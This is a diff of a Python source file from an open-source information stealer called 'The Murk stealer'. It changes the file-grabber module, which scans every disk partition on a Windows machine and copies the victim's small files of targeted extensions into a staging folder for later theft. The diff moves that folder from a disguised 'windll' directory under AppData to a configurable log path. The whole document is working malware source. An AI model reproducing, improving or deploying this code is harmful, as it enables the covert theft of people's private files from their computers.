@@ -10,15 +10,15 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import environ,sep,chdir,makedirs
+from os import environ,chdir,makedirs
 from psutil import disk_partitions
 from pathlib import Path
 from os.path import getsize
 from shutil import copy2
 from manager.logger import Log
+from preferences.config import config
 
-
-def Copy(fileList, path, extension, count):
+def Copy(fileList, user, extension, count):
     extension = extension[4:]
     for i in range (len(fileList)):
         count+=1
@@ -27,11 +27,11 @@ def Copy(fileList, path, extension, count):
             fname = fileList[i][num+1:]
             size = getsize(fileList[i])
             try:
-                 makedirs(rf'{path}\windll\Files\File-Grabber\{extension[1:]}')
+                makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}')
             except:
-                 pass
+                pass
             if size < 500000:
-                copy2(fileList[i],rf'{path}\windll\Files\File-Grabber\{extension[1:]}\{fname[:-len(extension)]}___{count}{extension}')
+                copy2(fileList[i],f'{user}\\{config.pathToLogs}\\Files\\File-Grabber\\{extension[1:]}\\{fname[:-len(extension)]}___{count}{extension}')
         except Exception as e:
             Log(f"{fname[:-len(extension)]}___{count}{extension} --> {e}")
     return count
@@ -40,9 +40,9 @@ def Grab():
     msgInfo = ""
     chdir("C:")
     try:
-        mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
+        user = environ['USERPROFILE']
         try:
-            makedirs(rf'{mainPath}\windll\Files\File-Grabber')
+            makedirs(f'{user}\\{config.pathToLogs}\\Files\\File-Grabber')
         except:
             pass
         try:
@@ -67,7 +67,7 @@ def Grab():
                         except Exception as e:
                             Log(drive+" search "+e)
                         try:
-                            filesGrab[i][1]= Copy(pathes,mainPath,filesGrab[i][0],filesGrab[i][1])
+                            filesGrab[i][1]= Copy(pathes,user,filesGrab[i][0],filesGrab[i][1])
                         except Exception as e:
                             Log(drive+" copy "+e)
             for i in range(len(filesGrab)):
